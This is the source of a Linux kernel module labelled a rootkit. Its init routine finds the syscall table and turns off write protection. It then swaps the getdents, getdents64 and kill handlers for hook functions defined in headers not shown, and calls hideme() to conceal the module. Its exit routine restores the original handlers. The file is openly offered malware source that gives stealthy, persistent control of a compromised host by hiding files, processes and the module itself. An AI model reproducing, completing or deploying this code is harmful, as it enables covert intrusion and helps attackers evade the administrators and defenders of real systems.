#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/slab.h>

#include "include/syscall_table_fetch.h"

#include "include/hide_show_helper.h"

#include "include/syscall_getdents64_hook.h"
#include "include/syscall_getdents_hook.h"
#include "include/syscall_kill_hook.h"

static int __init rootkit_init(void) {
	__sys_call_table = get_syscall_table();
	if (!__sys_call_table)
		return -1;

	cr0 = read_cr0();
#ifdef PTREGS_SYSCALL_STUBS
#ifdef __NR_getdents64
	original_getdents64 = (tt_syscall)__sys_call_table[__NR_getdents64];
#endif
#ifdef __NR_getdents
	original_getdents = (tt_syscall)__sys_call_table[__NR_getdents];
#endif
#ifdef __NR_kill
	original_kill = (tt_syscall)__sys_call_table[__NR_kill];
#endif
#else
#ifdef __NR_getdents64
	original_getdents64 = (tt_syscall_getdents64)__sys_call_table[__NR_getdents64];
#endif
#ifdef __NR_getdents
	original_getdents = (tt_syscall_getdents)__sys_call_table[__NR_getdents];
#endif
#ifdef __NR_kill
	original_kill = (tt_syscall_kill)__sys_call_table[__NR_kill];
#endif
#endif

	unprotect_memory();
#ifdef __NR_getdents64
	__sys_call_table[__NR_getdents64] = (unsigned long) getdents64_hook;
#endif
#ifdef __NR_getdents
	__sys_call_table[__NR_getdents] = (unsigned long) getdents_hook;
#endif
#ifdef __NR_kill
	__sys_call_table[__NR_kill] = (unsigned long) kill_hook;
#endif
	protect_memory();

	hideme();
    return 0;
}

static void __exit rootkit_exit(void) {
	struct linked_list_node *ptr, *tmp;

	unprotect_memory();
#ifdef __NR_getdents64
	__sys_call_table[__NR_getdents64] = (unsigned long) original_getdents64;
#endif
#ifdef __NR_getdents
	__sys_call_table[__NR_getdents] = (unsigned long) original_getdents;
#endif
#ifdef __NR_kill
	__sys_call_table[__NR_kill] = (unsigned long) original_kill;
#endif
	protect_memory();

	list_for_each_entry_safe(ptr, tmp, &excluded_pids, list){
		list_del(&ptr->list);
		kfree(ptr->data);
		kfree(ptr);
	}
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Blenderwizard");
MODULE_DESCRIPTION("Rootkit");
MODULE_VERSION("0.01");
